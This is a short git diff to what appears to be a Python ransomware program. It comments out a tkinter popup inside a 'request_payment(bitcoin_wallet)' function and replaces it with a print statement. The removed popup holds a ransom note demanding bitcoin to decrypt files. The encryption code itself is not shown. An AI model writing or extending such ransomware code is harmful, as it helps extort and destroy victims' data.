@@ -13,8 +13,9 @@ import traceback
 import re
 import pickle
 try:
-    import tkinter
-    import tkinter.messagebox
+    # import tkinter
+    # import tkinter.messagebox
+    import os
 except:
     pass
 
@@ -184,9 +185,10 @@ def request_payment(bitcoin_wallet):
 
     """
     try:
-        root = tkinter.Tk()
-        root.withdraw()
-        tkinter.messagebox.showwarning('Hackers Are Here', "You've been hit with ransomware! I've encrypted you file and will decrypt them once you send bitcoin payment to this address: <> I wouldn't disable anything on this computer or it'll be irrecoverable ;)")
+        # root = tkinter.Tk()
+        # root.withdraw()
+        # tkinter.messagebox.showwarning('Hackers Are Here', "You've been hit with ransomware! I've encrypted you file and will decrypt them once you send bitcoin payment to this address: <> I wouldn't disable anything on this computer or it'll be irrecoverable ;)")
+        print("Hackers are here!")
     except Exception as e:
         print(traceback.format_exc())
         return "Couldn't render alert box with tk"
